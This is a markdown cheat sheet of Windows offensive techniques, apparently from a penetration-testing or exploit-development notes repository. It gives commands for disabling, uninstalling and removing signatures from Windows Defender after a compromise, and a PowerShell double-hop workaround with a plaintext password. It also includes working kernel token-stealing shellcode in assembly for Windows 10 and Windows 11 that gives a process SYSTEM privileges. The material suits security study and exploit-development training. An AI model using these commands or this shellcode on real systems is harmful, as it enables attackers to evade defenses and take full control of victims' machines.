# Windows

---

### Table of Contents
- [Run Powershell Elevated](#run-powershell-elevated)
- [Disable Windows Defender](#disable-windows-defender)
- [Creating low Integrity cmd](#creating-low-integrity-cmd)
- [Powershell Double Hop](#powershell-double-hop)
- [WinDbg FuFu](https://github.com/ForsakenSystems/.github/blob/main/content/lost-and-found/expl/windbg.md)
- [Token Stealing Shellcode](#token-stealing-shellcode)

---

## Run Powershell Elevated
- Sometime is might be needed to start an elevated powershell from commandline

```powershell
# Directly from cmd
powershell -Command "Start-Process PowerShell -Verb RunAs"

# Start powershell first and than elevate
powershell
Start-Process PowerShell -Verb RunAs
```

## Disable Windows Defender
- In general (not directly working after compromise, even with system privileges )

```powershell
# use "query" to check status
sc stop WinDefend
```

- ... use one or more of these

```powershell
# Remove without reboot
Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet

# ... with reboot
Uninstall-WindowsFeature -Name Windows-Defender

# Disable real-time-protection
Set-MpPreference -DisableRealtimeMonitoring $true

# Exclude path
Set-MpPreference -ExclusionPath PATH_HERE

# Remove signatures
& 'C:\Program Files\Windows Defender\MpCmdRun.exe' -removedefinitions

# Disable application guard
Disable-WindowsOptionalFeature -FeatureName "Windows-Defender-ApplicationGuard" -Online
```

## Creating low Integrity cmd
- Creating cmd.exe with low integrity (here: from common cmd.exe, which runs by default as medium integrity)
- Same works for switching to high integrity, but this has to be done with elevated privileges: high > medium > low

```powershell
copy C:\Windows\System32\cmd.exe cmd_low.exe

icacls cmd_low.exe /setintegritylevel low

icacls.exe cmd_low.exe
	cmd_low.exe NT AUTHORITY\SYSTEM:(F)
	               BUILTIN\Administrators:(F)
	               PC\useer:(F)
	               NT AUTHORITY\SYSTEM:(I)(F)
	               BUILTIN\Administrators:(I)(F)
	               PC\user:(I)(F)
	               Mandatory Label\Low Mandatory Level:(NW)
```

## Powershell Double Hop
- PowerShell remoting does not allow to pass credentials, which might lead to the well known (kerberos) double hop problem
- In some cases it can be solved by doing the following (here: with powerview example executed from winrm session)

```powershell
# create credential object
$creds = New-Object System.Management.Automation.PSCredential('DOM\user', (ConvertTo-SecureString 'securePw' -AsPlainText -Force))

# use it
Get-DomainUser -AllowDelegation -AdminCount -Properties distinguishedname -Credential $creds
```

## Token Stealing Shellcode
- Simple token stealing shellcode (`masm` compatible)
- Windows 10
```asm
_TEXT	SEGMENT
    shellcode PROC
        mov rax, QWORD PTR gs:[0188h]
        mov rax, QWORD PTR [rax + 0b8h]
        mov rbx, rax
        __LOOP:
            mov rbx, QWORD PTR [rbx + 0448h]
            sub rbx, 0448h
            mov rcx, QWORD PTR [rbx + 0440h]
            cmp rcx, 04h
            jnz __LOOP
        __ADJUST:
            mov rcx, QWORD PTR [rbx + 04b8h]
            and cl, 0f0h
            mov QWORD PTR [rax + 04b8h], rcx
        __CLEANUP:
            mov rax, QWORD PTR gs:[0188h]
            mov cx, WORD PTR [rax + 01e4h]
            inc cx
            mov WORD PTR [rax + 01e4h], cx
            mov rdx, QWORD PTR [rax + 090h]
            mov rcx, QWORD PTR [rdx + 0168h]
            mov r11, QWORD PTR [rdx + 0178h]
            mov rsp, QWORD PTR [rdx + 0180h]
            mov rbp, QWORD PTR [rdx + 0158h]
            xor eax, eax
            swapgs
            sysretq
    shellcode ENDP
_TEXT	ENDS
END
```

- Windows 11 (adjusted `_EPROCESS`)
```asm
_TEXT	SEGMENT
    shellcode PROC
            mov rax, QWORD PTR gs:[0188h]
            mov rax, QWORD PTR [rax + 0b8h]
            nop
            mov rbx, rax
            nop
        __LOOP:
            mov rbx, QWORD PTR [rbx + 01d8h]
            nop
            sub rbx, 01d8h
            nop
            mov rcx, QWORD PTR [rbx + 01d0h]
            nop
            cmp rcx, 04h
            nop
            jnz __LOOP
        __ADJUST:
            ;int 3
            mov rcx, QWORD PTR [rbx + 0248h]
            and cl, 0f0h
            mov QWORD PTR [rax + 0248h], rcx
        __CLEANUP:
            mov rax, QWORD PTR gs:[0188h]
            mov cx, WORD PTR [rax + 01e4h]
            inc cx
            mov WORD PTR [rax + 01e4h], cx
            mov rdx, QWORD PTR [rax + 090h]
            mov rcx, QWORD PTR [rdx + 0168h]
            mov r11, QWORD PTR [rdx + 0178h]
            mov rsp, QWORD PTR [rdx + 0180h]
            mov rbp, QWORD PTR [rdx + 0158h]
            nop
            xor eax, eax
            swapgs
            sysretq
    shellcode ENDP
_TEXT	ENDS
END
```
